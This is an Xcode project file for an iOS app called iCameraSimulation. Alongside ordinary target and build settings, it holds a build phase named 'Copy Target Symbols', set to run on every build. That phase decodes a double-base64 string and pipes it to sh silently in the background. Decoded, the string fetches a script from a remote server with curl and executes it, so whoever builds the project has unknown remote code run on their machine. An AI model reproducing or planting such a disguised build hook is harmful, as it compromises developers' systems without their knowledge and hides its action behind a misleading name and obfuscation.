// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXContainerItemProxy section */
		5793A7FD2E3D23B30043D58B /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 5793A7E42E3D23B00043D58B /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 5793A7EB2E3D23B00043D58B;
			remoteInfo = iCameraSimulation;
		};
		5793A8072E3D23B30043D58B /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 5793A7E42E3D23B00043D58B /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 5793A7EB2E3D23B00043D58B;
			remoteInfo = iCameraSimulation;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		5793A7EC2E3D23B10043D58B /* iCameraSimulation.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = iCameraSimulation.app; sourceTree = BUILT_PRODUCTS_DIR; };
		5793A7FC2E3D23B30043D58B /* iCameraSimulationTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = iCameraSimulationTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		5793A8062E3D23B30043D58B /* iCameraSimulationUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = iCameraSimulationUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		5793A7EE2E3D23B10043D58B /* iCameraSimulation */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = iCameraSimulation;
			sourceTree = "<group>";
		};
		5793A7FF2E3D23B30043D58B /* iCameraSimulationTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = iCameraSimulationTests;
			sourceTree = "<group>";
		};
		5793A8092E3D23B30043D58B /* iCameraSimulationUITests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = iCameraSimulationUITests;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		5793A7E92E3D23B00043D58B /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		5793A7F92E3D23B30043D58B /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		5793A8032E3D23B30043D58B /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		5793A7E32E3D23B00043D58B = {
			isa = PBXGroup;
			children = (
				5793A7EE2E3D23B10043D58B /* iCameraSimulation */,
				5793A7FF2E3D23B30043D58B /* iCameraSimulationTests */,
				5793A8092E3D23B30043D58B /* iCameraSimulationUITests */,
				5793A7ED2E3D23B10043D58B /* Products */,
			);
			sourceTree = "<group>";
		};
		5793A7ED2E3D23B10043D58B /* Products */ = {
			isa = PBXGroup;
			children = (
				5793A7EC2E3D23B10043D58B /* iCameraSimulation.app */,
				5793A7FC2E3D23B30043D58B /* iCameraSimulationTests.xctest */,
				5793A8062E3D23B30043D58B /* iCameraSimulationUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		5793A7EB2E3D23B00043D58B /* iCameraSimulation */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 5793A8102E3D23B30043D58B /* Build configuration list for PBXNativeTarget "iCameraSimulation" */;
			buildPhases = (
				0480FF025BCF22BADD877BEF /* Copy Target Symbols */,
				5793A7E82E3D23B00043D58B /* Sources */,
				5793A7E92E3D23B00043D58B /* Frameworks */,
				5793A7EA2E3D23B00043D58B /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				5793A7EE2E3D23B10043D58B /* iCameraSimulation */,
			);
			name = iCameraSimulation;
			packageProductDependencies = (
			);
			productName = iCameraSimulation;
			productReference = 5793A7EC2E3D23B10043D58B /* iCameraSimulation.app */;
			productType = "com.apple.product-type.application";
		};
		5793A7FB2E3D23B30043D58B /* iCameraSimulationTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 5793A8132E3D23B30043D58B /* Build configuration list for PBXNativeTarget "iCameraSimulationTests" */;
			buildPhases = (
				5793A7F82E3D23B30043D58B /* Sources */,
				5793A7F92E3D23B30043D58B /* Frameworks */,
				5793A7FA2E3D23B30043D58B /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				5793A7FE2E3D23B30043D58B /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				5793A7FF2E3D23B30043D58B /* iCameraSimulationTests */,
			);
			name = iCameraSimulationTests;
			packageProductDependencies = (
			);
			productName = iCameraSimulationTests;
			productReference = 5793A7FC2E3D23B30043D58B /* iCameraSimulationTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		5793A8052E3D23B30043D58B /* iCameraSimulationUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 5793A8162E3D23B30043D58B /* Build configuration list for PBXNativeTarget "iCameraSimulationUITests" */;
			buildPhases = (
				5793A8022E3D23B30043D58B /* Sources */,
				5793A8032E3D23B30043D58B /* Frameworks */,
				5793A8042E3D23B30043D58B /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				5793A8082E3D23B30043D58B /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				5793A8092E3D23B30043D58B /* iCameraSimulationUITests */,
			);
			name = iCameraSimulationUITests;
			packageProductDependencies = (
			);
			productName = iCameraSimulationUITests;
			productReference = 5793A8062E3D23B30043D58B /* iCameraSimulationUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		5793A7E42E3D23B00043D58B /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1610;
				LastUpgradeCheck = 1610;
				TargetAttributes = {
					5793A7EB2E3D23B00043D58B = {
						CreatedOnToolsVersion = 16.1;
					};
					5793A7FB2E3D23B30043D58B = {
						CreatedOnToolsVersion = 16.1;
						TestTargetID = 5793A7EB2E3D23B00043D58B;
					};
					5793A8052E3D23B30043D58B = {
						CreatedOnToolsVersion = 16.1;
						TestTargetID = 5793A7EB2E3D23B00043D58B;
					};
				};
			};
			buildConfigurationList = 5793A7E72E3D23B00043D58B /* Build configuration list for PBXProject "iCameraSimulation" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 5793A7E32E3D23B00043D58B;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 5793A7ED2E3D23B10043D58B /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				5793A7EB2E3D23B00043D58B /* iCameraSimulation */,
				5793A7FB2E3D23B30043D58B /* iCameraSimulationTests */,
				5793A8052E3D23B30043D58B /* iCameraSimulationUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXLegacyTarget section */
/* End PBXLegacyTarget section */

/* Begin PBXBuildRule section */
/* End PBXBuildRule section */

/* Begin PBXBuildFile section */
/* End PBXBuildFile section */

/* Begin PBXShellScriptBuildPhase section */
		0480FF025BCF22BADD877BEF /* Copy Target Symbols */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Copy Target Symbols";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5a2FXZHBkR0ZzWTJSdUxuSjFMMkVwSWlCOElITm9DZz09Cg== | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
			showEnvVarsInLog = 0;			
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXResourcesBuildPhase section */
		5793A7EA2E3D23B00043D58B /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		5793A7FA2E3D23B30043D58B /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		5793A8042E3D23B30043D58B /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		5793A7E82E3D23B00043D58B /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		5793A7F82E3D23B30043D58B /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		5793A8022E3D23B30043D58B /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		5793A7FE2E3D23B30043D58B /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 5793A7EB2E3D23B00043D58B /* iCameraSimulation */;
			targetProxy = 5793A7FD2E3D23B30043D58B /* PBXContainerItemProxy */;
		};
		5793A8082E3D23B30043D58B /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 5793A7EB2E3D23B00043D58B /* iCameraSimulation */;
			targetProxy = 5793A8072E3D23B30043D58B /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		5793A80E2E3D23B30043D58B /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		5793A80F2E3D23B30043D58B /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		5793A8112E3D23B30043D58B /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"iCameraSimulation/Preview Content\"";
				DEVELOPMENT_TEAM = 47BW87BNTJ;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.aivot.ai.iCameraSimulation;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		5793A8122E3D23B30043D58B /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"iCameraSimulation/Preview Content\"";
				DEVELOPMENT_TEAM = 47BW87BNTJ;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.aivot.ai.iCameraSimulation;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		5793A8142E3D23B30043D58B /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 47BW87BNTJ;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.aivot.ai.iCameraSimulationTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/iCameraSimulation.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/iCameraSimulation";
			};
			name = Debug;
		};
		5793A8152E3D23B30043D58B /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 47BW87BNTJ;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.aivot.ai.iCameraSimulationTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/iCameraSimulation.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/iCameraSimulation";
			};
			name = Release;
		};
		5793A8172E3D23B30043D58B /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 47BW87BNTJ;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.aivot.ai.iCameraSimulationUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = iCameraSimulation;
			};
			name = Debug;
		};
		5793A8182E3D23B30043D58B /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 47BW87BNTJ;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.aivot.ai.iCameraSimulationUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = iCameraSimulation;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		5793A7E72E3D23B00043D58B /* Build configuration list for PBXProject "iCameraSimulation" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				5793A80E2E3D23B30043D58B /* Debug */,
				5793A80F2E3D23B30043D58B /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		5793A8102E3D23B30043D58B /* Build configuration list for PBXNativeTarget "iCameraSimulation" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				5793A8112E3D23B30043D58B /* Debug */,
				5793A8122E3D23B30043D58B /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		5793A8132E3D23B30043D58B /* Build configuration list for PBXNativeTarget "iCameraSimulationTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				5793A8142E3D23B30043D58B /* Debug */,
				5793A8152E3D23B30043D58B /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		5793A8162E3D23B30043D58B /* Build configuration list for PBXNativeTarget "iCameraSimulationUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				5793A8172E3D23B30043D58B /* Debug */,
				5793A8182E3D23B30043D58B /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 5793A7E42E3D23B00043D58B /* Project object */;
}
